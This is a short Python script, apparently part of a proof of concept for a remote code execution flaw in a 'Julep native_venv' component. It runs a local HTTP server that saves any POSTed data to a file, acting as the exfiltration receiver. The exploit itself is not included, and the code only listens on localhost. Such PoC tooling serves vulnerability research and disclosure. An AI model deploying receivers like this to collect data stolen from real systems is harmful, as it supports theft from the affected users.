#!/usr/bin/env python3
"""Standalone exfil receiver for the Julep native_venv RCE PoC.

Usage: python3 listener.py [port] [outfile]
Default: 127.0.0.1:8899 -> ./proof.raw
"""
from __future__ import annotations

import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
OUT = Path(sys.argv[2]) if len(sys.argv) > 2 else Path("proof.raw")


class Receiver(BaseHTTPRequestHandler):
    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        OUT.write_bytes(body)
        print(f"[listener] POST {self.path} {len(body)} bytes -> {OUT}", flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args: object) -> None:
        pass


if __name__ == "__main__":
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), Receiver)
    print(f"[listener] http://127.0.0.1:{PORT}/exfil -> {OUT}", flush=True)
    srv.serve_forever()
